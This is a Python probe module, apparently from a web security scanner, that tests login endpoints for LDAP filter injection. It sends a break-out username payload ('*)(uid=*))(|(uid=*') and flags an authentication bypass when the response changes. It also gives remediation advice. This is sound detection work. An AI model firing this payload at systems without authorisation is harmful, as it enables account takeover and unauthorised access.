"""LDAP injection probe.

Detects auth bypass via LDAP filter injection on common login endpoints.
Apps that bind user input directly into an LDAP search filter (e.g.
`(&(uid={user})(pwd={pass}))`) can be bypassed with wildcard-and-paren
payloads that close out the filter and inject an always-true clause.

Two-step shape:
1. Baseline: clean credentials, expect 401/403 reject.
2. Perturbation: LDAP filter break-out payload as the username.

Detection signals:
- status flips from 401/403 to 200 (likely auth bypass)
- response sets a session cookie or returns a token (token, jwt,
  authorization, access_token in body)
- redirect to a post-login landing page (/dashboard, /home, /account)

Severity: critical when status 200 plus a token, high on a status flip
without an observable token. Read-mostly POST; safe to run anonymously.
"""
from __future__ import annotations

import re
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_post_json

# Common login endpoints across SPAs and REST APIs.
DEFAULT_CANDIDATES: tuple[str, ...] = (
    "/login",
    "/api/login",
    "/api/auth/login",
    "/rest/user/login",
)

BASELINE_PAYLOAD: dict[str, str] = {
    "username": "clean_user",
    "password": "clean_pass",
}

# LDAP filter break-out: closes the username clause and injects `(|(uid=*` as
# an always-true OR. Servers that bind raw input into the filter return the
# first user, often skipping the password check.
ATTACK_PAYLOAD: dict[str, str] = {
    "username": "*)(uid=*))(|(uid=*",
    "password": "x",
}

_REJECT_STATUSES: frozenset[int] = frozenset({401, 403})

_TOKEN_REGEX = re.compile(
    r"\b(token|jwt|authorization|access_token|id_token|bearer)\b",
    re.IGNORECASE,
)

_LANDING_REGEX = re.compile(
    r"/(dashboard|home|account|profile|admin)\b",
    re.IGNORECASE,
)


def _has_auth_signal(headers: dict[str, str], body: str) -> tuple[bool, str]:
    """Return (signal_present, detail) when the response looks authenticated."""
    if "Set-Cookie" in headers or "set-cookie" in headers:
        cookie = headers.get("Set-Cookie") or headers.get("set-cookie", "")
        return True, f"Set-Cookie issued: {cookie[:120]}"

    location = headers.get("Location") or headers.get("location", "")
    if location and _LANDING_REGEX.search(location):
        return True, f"Redirect to authenticated landing: {location[:120]}"

    if _TOKEN_REGEX.search(body[:4096]):
        return True, "Auth token-shaped field in response body"

    return False, ""


def _emit(
    target: str,
    severity: str,
    detail: str,
    baseline_status: int,
    attack_status: int,
) -> dict[str, Any]:
    return {
        "title": f"LDAP injection auth bypass: {detail}",
        "severity": severity,
        "category": "auth_bypass",
        "target": target,
        "evidence": (
            f"baseline_status={baseline_status} attack_status={attack_status} "
            f"signal={detail}"
        ),
        "bug_class": "auth_bypass",
        "remediation": (
            "Bind user input through LDAP-safe APIs (parameterized search) "
            "or escape filter metacharacters per RFC 4515. Never concatenate "
            "raw user input into an LDAP search filter."
        ),
    }


@registry.probe(
    name="web.ldap_injection",
    bug_class="auth_bypass",
    severity_max="critical",
    owasp="A03:2021",
    runtime_budget_s=6.0,
    tags=("anonymous", "high-roi"),
    requires_auth=False,
)
async def probe_ldap_injection(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Two-step LDAP injection probe across login endpoints."""
    candidates = ctx.candidate_endpoints or DEFAULT_CANDIDATES
    base = ctx.base
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        baseline_status, _baseline_headers, _baseline_body = await http_post_json(
            ctx.session, url, BASELINE_PAYLOAD
        )

        # Baseline must look like a normal rejection. If the endpoint returns
        # 200 to clean creds it's not a real login surface; skip to avoid noise.
        if baseline_status not in _REJECT_STATUSES:
            continue

        attack_status, attack_headers, attack_body = await http_post_json(
            ctx.session, url, ATTACK_PAYLOAD
        )

        status_flip = attack_status == 200
        signal_present, detail = _has_auth_signal(attack_headers, attack_body)

        if status_flip and signal_present:
            severity = "critical"
            description = f"status flip 200 with auth signal ({detail})"
        elif status_flip:
            severity = "high"
            description = "status flip from reject to 200 without token"
        else:
            continue

        if url in seen:
            continue
        seen.add(url)
        findings.append(
            _emit(url, severity, description, baseline_status, attack_status)
        )

    return findings
